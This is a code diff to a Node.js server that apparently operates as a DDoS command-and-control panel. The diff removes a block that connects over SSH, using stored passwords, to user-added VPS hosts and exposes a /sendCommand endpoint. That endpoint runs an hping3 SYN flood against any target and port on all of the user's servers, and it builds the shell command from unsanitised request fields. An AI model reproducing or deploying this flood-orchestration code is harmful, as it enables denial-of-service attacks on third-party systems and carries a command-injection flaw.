@@ -57,9 +57,6 @@ const DB_PATH = "./database.json";
 let activeKeys = {};
 const KEY_FILE = path.join(__dirname, 'keyList.json');
 let cncActive = true;
-let vpsList = [];
-let vpsConnections = {}
-const VPS_FILE = 'vps.json';
 let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
 
 const activeConnections = {};
@@ -354,154 +351,12 @@ if (fs.existsSync(KEY_FILE)) {
   }
 }
 
-function connectToAllVPS() {
-  if (!cncActive) return;
-
-  console.log("🔄 Connecting to all VPS servers...");
-
-  for (const vps of vpsList) {
-    if (vpsConnections[vps.host]) {
-      console.log(`✅ Already connected to ${vps.host}`);
-      continue;
-    }
-
-    const conn = new Client();
-
-    conn.on('ready', () => {
-      if (!cncActive) {
-        conn.end();
-        return;
-      }
-
-      console.log(`✅ Connected to VPS: ${vps.host}`);
-      vpsConnections[vps.host] = conn;
-
-      conn.on('close', () => {
-        console.log(`🔌 Disconnected: ${vps.host}`);
-        delete vpsConnections[vps.host];
-
-        if (cncActive) {
-          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
-          setTimeout(connectToAllVPS, 5000);
-        }
-      });
-    });
-
-    conn.on('error', (err) => {
-      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
-    });
-
-    conn.connect({
-      host: vps.host,
-      username: vps.username,
-      password: vps.password,
-      readyTimeout: 5000
-    });
-  }
-}
-
-function disconnectAllVPS() {
-  console.log("🛑 Disconnecting all VPS connections...");
-  cncActive = false;
-
-  for (const host in vpsConnections) {
-    vpsConnections[host].end();
-    delete vpsConnections[host];
-  }
-}
-
-if (fs.existsSync(VPS_FILE)) {
-  try {
-    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
-    console.log("VPS list loaded.");
-    connectToAllVPS();
-  } catch (err) {
-    console.error("Error loading VPS file:", err.message);
-  }
-}
-
-fs.watch(VPS_FILE, () => {
-  try {
-    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
-    console.log("🔄 VPS list updated.");
-    connectToAllVPS();
-  } catch (e) {
-    console.error("❌ Failed to update VPS list:", e.message);
-  }
-});
-
 function getUserByKey(key) {
   const keyInfo = activeKeys[key];
   const db = loadDatabase();
   const user = db.find(u => u.username === keyInfo.username);
   return user ? keyInfo.username : null;
 }
-
-app.get("/myServer", (req, res) => {
-  const key = req.query.key;
-  const username = getUserByKey(key);
-  if (!username) return res.status(401).json({ error: "Invalid session key" });
-
-  const userVPS = vpsList.filter(vps => vps.owner === username);
-  res.json(userVPS);
-});
-
-app.post("/addServer", (req, res) => {
-  const { key, host, username: sshUser, password } = req.body;
-  const owner = getUserByKey(key);
-  if (!owner) return res.status(401).json({ error: "Invalid session key" });
-
-  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });
-
-  const newVPS = { host, username: sshUser, password, owner };
-  vpsList.push(newVPS);
-  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
-  res.json({ success: true, message: "VPS added" });
-});
-
-app.post("/delServer", (req, res) => {
-  const { key, host } = req.body;
-  const owner = getUserByKey(key);
-  if (!owner) return res.status(401).json({ error: "Invalid session key" });
-
-  const before = vpsList.length;
-  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
-  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
-
-  const deleted = before !== vpsList.length;
-  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
-});
-
-app.post("/sendCommand", (req, res) => {
-  const { key, target, port, duration } = req.body;
-  const owner = getUserByKey(key);
-  if (!owner) return res.status(401).json({ error: "Invalid session key" });
-
-  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });
-
-  const userVPS = vpsList.filter(vps => vps.owner === owner);
-  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });
-
-  for (const vps of userVPS) {
-    const conn = vpsConnections[vps.host];
-    if (!conn) {
-      console.log(`❌ Not connected to ${vps.host}`);
-      continue;
-    }
-
-    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
-    const killCmd = `sleep ${duration}; pkill screen`;
-
-    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
-      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
-      stream.on('close', (code, signal) => {
-        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
-      });
-    });
-  }
-
-  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
-});
 
 function loadDatabase() {
   if (!fs.existsSync(DB_PATH)) {
